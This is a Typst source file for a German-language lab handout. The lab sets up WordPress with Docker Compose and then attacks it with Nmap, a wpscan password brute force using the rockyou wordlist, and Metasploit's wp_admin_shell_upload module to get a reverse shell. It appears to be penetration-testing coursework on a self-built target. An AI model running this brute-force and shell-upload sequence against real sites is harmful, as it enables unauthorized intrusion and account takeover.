#import "@preview/document:0.1.0": *
#import "@preview/cheq:0.2.2": checklist
#show: checklist
#import "@preview/codelst:2.0.2": sourcecode
#import table: cell, header
= Metasploit Framework

== Theorie
=== Docker Compose
Mit Docker Compose können mehrere Container in einer einzigen Datei definiert werden, ebenso wie ihre gegenseitigen Beziehungen. Alle Container können dann mit nur einem einzigen Befehl gestartet werden. Dies erweist sich als besonders praktisch, da die Datei geteilt werden kann, um eine einheitliche Serverumgebung sicherzustellen. 

=== Wordpress
Wordpress ist eine Open-Source-Managment-System, dass dem Nutzer auf einer einfache Weise ermöglicht wichtige Aspetke einer Website - wie zum Beispiel: Design - zu verwalten. Jede rund jede vierte Website wird durch Wordpress gehostet, da es sehr beliebt ist und wenig technisches Wissen erfordert.

=== Metasploit
Das Metasploit-Projekt ist ein Projekt zur Computersicherheit, das Informationen über Sicherheitslücken bietet und bei Penetrationstests sowie der Entwicklung von IDS-Signaturen eingesetzt werden kann. Das bekannteste Teilprojekt ist das freie Metasploit Framework, ein Werkzeug zur Entwicklung und Ausführung von Exploits gegen verteilte Zielrechner. Andere wichtige Teilprojekte sind das Shellcode-Archiv und Forschung im Bereich der IT-Sicherheit.
==== Nmap
Nmap ist ein freier Portscan der verwendet wird um Informationen über das Zielsystem herauszufinden. Das Programm schaut nach offenen Ports im Netzwerk und ist beliebt um die Netzwerksicherheit zu gewährleisten. 

== Checkliste

=== Wordpress
- [ ] Installation von Docker-Compose
- [ ] Erstellung von Wordpress Projekt 
- [ ] Erstellung von YAML Datei 
- [ ] Start des Projektes
- [ ] Grundkonfiguration von Wordpress 
=== Metasploit
- [ ] Installation von Database Server
- [ ] Starten von Metasploit
- [ ] Durchführung von Nmap Scan
=== Passwort Attacke
- [ ] Durchführung von wpscan 
- [ ] Auslesen von User & Passwort
- [ ] Starten einer Reversed-Shell
- [ ] Ausführung von Befehlen auf Metasploit

== Befehlsreferenz
#[
#set par(justify: false);
#set table(
  stroke: (x, y) => (
    if y == 0 {
      (bottom: 0.7pt + black)
    } else {
      (bottom: 0.2pt + gray)
    }
  ),
  align: (x, y) => (
    if x > 0 { center }
    else { left }
  )
)

#table(
  columns: (3fr, 2fr),
  inset: 10pt,
  align: horizon,
  table.header(
    [*Command*],
    [*Erklärung*],
  ),
  [
```bash sudo apt-get install docker-compose-plugin```
],
  [Installation von Docker-Compose], 
  [```bash sudo snap install docker```],
  [Installation von Docker],
  [```bash cd my_wordpress```],
  [Erstellung vom Projekt],
  [siehe YAML (Kapitel 5.3.1)],
  [Erstellung von YAML Datei],
  [```bash docker-compose up -d```],
  [Starten von dem Service],
  [```bash sudo systemctl start postgresql```],
  [Installation von Database Server],
  [```bash sudo systemctl start postgresql```],
  [Installation von Database Server],
   [```bash msfconsole```],
  [Starten von Metasploit],
  [```bash  db_nmap -v -sV 192.168.181.167```],
  [Durchführung von Map Scan],
  [```bash hosts```],
  [Erkannte Hosts anzeigen],
  [```bash wpscan --url http://192.168.181.167 -U users.txt -P /usr/share/wordlists/rockyou.txt```],
  [Durchführung von wpscan],
  [ Reversed-Shell Ausführung (Kapitel 5.3.2)],
  [Reversed-Shell Ausführung],
)
]
=== docker-compose.yml
In dem nachfolgenden Codeblock steht die Konfiguration der docker-compose.yml Datei. 
#sourcecode[```yaml
services:
  db:
    # We use a mariadb image which supports both amd64 & arm64 architecture
    image: mariadb:10.6.4-focal
    # If you really want to use MySQL, uncomment the following line
    #image: mysql:8.0.27
    command: '--default-authentication-plugin=mysql_native_password'
    volumes:
      - db_data:/var/lib/mysql
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=somewordpress
      - MYSQL_DATABASE=wordpress
      - MYSQL_USER=wordpress
      - MYSQL_PASSWORD=wordpress
    expose:
      - 3306
      - 33060
  wordpress:
    image: wordpress:latest
    volumes:
      - wp_data:/var/www/html
    ports:
      - 80:80
    restart: always
    environment:
      - WORDPRESS_DB_HOST=db
      - WORDPRESS_DB_USER=wordpress
      - WORDPRESS_DB_PASSWORD=wordpress
      - WORDPRESS_DB_NAME=wordpress
volumes:
  db_data:
  wp_data:
```] 

=== Reversed-Shell
In dem nachfolgenden Codeblock steht die Konfiguration der Reversed-Shell
```bash
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.181.167  # Ziel-IP des WordPress-Servers
set TARGETURI /             # WordPress läuft direkt im Root-Verzeichnis
set USERNAME Morris         # Administrator-Benutzername
set PASSWORD Ganzgeheim123! # Administrator-Passwort
exploit
```
